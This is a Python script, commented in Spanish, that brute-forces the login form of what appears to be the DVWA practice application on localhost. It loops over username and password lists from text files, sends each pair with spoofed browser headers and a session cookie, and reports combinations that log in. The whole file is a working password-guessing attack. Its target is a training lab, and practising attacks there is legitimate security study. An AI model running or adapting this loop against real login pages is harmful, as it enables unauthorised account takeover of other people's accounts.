import requests
import time

# Función para leer el contenido de un archivo y devolver una lista
def leer_lista_desde_archivo(nombre_archivo):
    with open(nombre_archivo, 'r') as archivo:
        # Elimina espacios y saltos de línea de cada línea
        return [linea.strip() for linea in archivo.readlines()]

start_time = time.time()

# URL base para la solicitud de fuerza bruta
url_base = "http://localhost:8080/vulnerabilities/brute/"

# Encabezados actualizados
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'es-US,es-419;q=0.9,es;q=0.8',
    'Connection': 'keep-alive',
    'Cookie': 'PHPSESSID=7hm6ptm413mrlhp7e4b5lbapq5; security=low',  # Cookie actualizada
    'DNT': '1',
    'Host': 'localhost:8080',
    'Referer': 'http://localhost:8080/vulnerabilities/brute/',  # Referer actualizado
    'Sec-Ch-Ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/128.0.0.0 Safari/537.36'
}

# Leer usuarios y contraseñas desde archivos
users = leer_lista_desde_archivo('users.txt')
passwords = leer_lista_desde_archivo('passwords.txt')

# Intento de fuerza bruta
for user in users:
    for password in passwords:
        # Parámetros de la solicitud (username y password)
        params = {
            'username': user,
            'password': password,
            'Login': 'Login'
        }
        
        # Enviar la solicitud GET para intentar iniciar sesión
        response = requests.get(url_base, headers=headers, params=params)
        
        # Verificar si el login fue exitoso buscando una cadena en la respuesta
        if 'Welcome to the password protected area' in response.text:
            print(f"[+] Login exitoso! Usuario: {user} | Contraseña: {password}")

end_time = time.time()
print(f"Tiempo de ejecución: {end_time - start_time} segundos")